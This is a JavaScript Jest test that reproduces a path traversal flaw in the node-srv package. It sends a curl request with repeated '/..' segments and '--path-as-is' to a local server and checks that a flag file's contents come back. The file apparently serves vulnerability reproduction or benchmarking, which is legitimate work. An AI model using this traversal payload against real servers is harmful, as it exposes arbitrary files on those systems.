//killing any other process using the same port
var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 8080/tcp");
  } catch (e) {}
});
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in node-srv", (done) => {
  let Server = require("node-srv");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8080/tcp", () => {});
  } catch (e) {}
  let srv = new Server(
    {
      port: 8080,
      root: "./",
      logs: true,
    },
    function () {}
  );
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    srv.stop();
    done();
  });
});
